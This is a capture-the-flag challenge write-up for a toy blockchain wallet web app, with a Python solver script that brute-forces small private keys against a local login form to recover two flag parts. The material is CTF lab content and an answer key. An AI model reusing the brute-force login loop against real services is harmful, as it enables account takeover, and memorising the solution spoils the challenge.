# satoshi from wish

## Daniel Boye

## Category: {Web}

## Problem Statement

You are presented with a blockchain-based wallet system, where users, such as Alice and Bob, can conduct transactions securely. The goal is to gain access to the wallet by identifying the correct public and private keys and extract the hidden flag, split into two parts.

The blockchain wallet system is implemented using a simple blockchain data structure. Each user can create transactions to send coins to other users in the system.

Your task is to analyze the blockchain wallet system and find a way to log in as both Alice and Bob to extract the hidden flag parts.

Submit the public and private keys to gain access to the dashboard.
Once logged in as both users, combine the flag parts to reveal the complete flag.

## Flavor Text

The blockchain wallet system is implemented using a simple blockchain data structure. Each user can create transactions to send coins to other users in the system.

The system has two users, each with their unique public and private key system.

Your task is to analyze the blockchain wallet system and find a way to log in as both users to extract the hidden flag parts.

Once logged in as both users, combine the flag parts to reveal the complete flag.

The flag is in the format: <flag_part1><flag_part2>

## Difficulty

- **Easy:** 1-5 steps, typically 2-5

## Challenge Information (2/3)

- **Estimated Solve Time:** 10min-30min
- **Solver Script:** 

```python
import requests
from bs4 import BeautifulSoup

# Change the port to the Flask app's running address. 
BASE_URL = "http://127.0.0.1:5002"
session = requests.Session()

def try_login(public_key, private_key):
    data = {
        "public_key": public_key,
        "private_key": private_key
    }
    response = session.post(f"{BASE_URL}/", data=data)
    return response

def get_flag_from_html(html_content):
    soup = BeautifulSoup(html_content, "html.parser")
    flag_element = soup.find("p", {"id": "flag"})
    if flag_element:
        flag = flag_element.text.strip().replace("Flag: ", "")
        return flag
    return None

def combine_flags(alice_flag, bob_flag):
    full_flag = alice_flag + bob_flag
    return full_flag

def main():
    global alice_flag_part
    global bob_flag_part

    public_keys_response = session.get(f"{BASE_URL}/public_keys")
    public_keys_data = public_keys_response.json()

    for username, user_data in public_keys_data.items():
        public_key = user_data
        print(f"\nTrying to log in as {username} with public key: {public_key}")

        for private_key_guess in range(1, 10001):
            response = try_login(public_key, private_key_guess)
            if "Welcome" in response.text:
                flag = get_flag_from_html(response.text)
                if flag:
                    print(f"\nFlag for {username}: {flag}")
                    print(f"Private key that worked: {private_key_guess}")
                    if username == "Alice":
                        alice_flag_part = flag
                    elif username == "Bob":
                        bob_flag_part = flag
                    if alice_flag_part and bob_flag_part:
                        full_flag = combine_flags(alice_flag_part, bob_flag_part)
                        print(f"\nFull flag: {full_flag}\n")
                        return
                else:
                    print(f"Flag not found for {username}")
                break

if __name__ == "__main__":
    alice_flag_part = ""
    bob_flag_part = ""
    main()
```

## Type

- **Single Docker Container** Runs in one docker container. Run the setup.sh to start it. If you want to edit the port, do it in the ./setup and in the app.py